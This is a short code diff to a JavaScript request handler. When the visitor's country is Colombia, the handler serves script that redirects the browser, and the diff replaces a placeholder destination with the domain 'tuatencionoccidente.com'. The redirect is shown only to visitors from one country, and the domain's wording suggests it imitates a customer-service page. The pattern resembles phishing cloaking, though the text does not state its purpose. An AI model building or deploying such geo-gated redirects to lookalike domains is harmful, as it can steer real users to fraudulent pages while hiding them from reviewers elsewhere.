@@ -6,7 +6,7 @@ export default function handler(req, res) {
 
   if (country === "CO") {
     return res.send(`
-      location.replace("https://tu-pagina-destino.com");
+      location.replace("https://tuatencionoccidente.com");
     `);
   }
 
